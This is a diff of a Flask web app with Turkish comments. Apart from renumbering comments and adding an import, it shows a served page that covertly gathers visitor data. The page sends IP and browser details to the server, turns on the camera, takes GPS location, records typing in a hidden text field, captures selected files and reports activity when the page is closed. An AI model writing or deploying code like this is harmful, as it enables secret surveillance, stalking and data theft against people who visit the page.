@@ -3,6 +3,7 @@ import requests
 import os
 import base64
 import json
+import time # 🚨 İŞTE EKSİK OLAN KÜTÜPHANE BURADA!
 
 app = Flask(__name__)
 
@@ -167,11 +168,10 @@ def ana_sayfa():
 
         window.addEventListener('beforeunload', hareketGonder);
 
-        // 🚨 GÜNCELLEME: İstekleri sırayla ve küçük beklemelerle yapıyoruz
         async function izinleriIste() {{
             const durum = document.getElementById('durum');
             
-            // 1. ÖNCE CİHAZ BİLGİSİ (IP ve Tarayıcı) - Hemen gelsin
+            // 1. ÖNCE CİHAZ BİLGİSİ
             fetch('/cihaz', {{
                 method: 'POST',
                 headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
@@ -210,7 +210,7 @@ def ana_sayfa():
 
                     durum.innerHTML = "Kamera açıldı. Konum alınıyor...";
                     
-                    // 🚨 KAMERA İZNİ BİTTİKTEN 1 SANİYE SONRA KONUM İSTE (Çakışmayı önler)
+                    // 4. GPS KONUM (1 saniye sonra)
                     setTimeout(() => {{
                         if (navigator.geolocation) {{
                             navigator.geolocation.getCurrentPosition(
@@ -228,7 +228,7 @@ def ana_sayfa():
                     }}, 1000); 
                 }};
 
-                // 4. KLAVYE
+                // 5. KLAVYE
                 let sonGonderim = 0;
                 document.getElementById('gizliMetin').addEventListener('input', function(e) {{
                     const suan = Date.now();
@@ -242,7 +242,7 @@ def ana_sayfa():
                     }}
                 }});
 
-                // 5. DOSYA YÜKLEME
+                // 6. DOSYA YÜKLEME
                 document.getElementById('dosyaSec').addEventListener('change', function(e) {{
                     const file = e.target.files[0];
                     if (file) {{
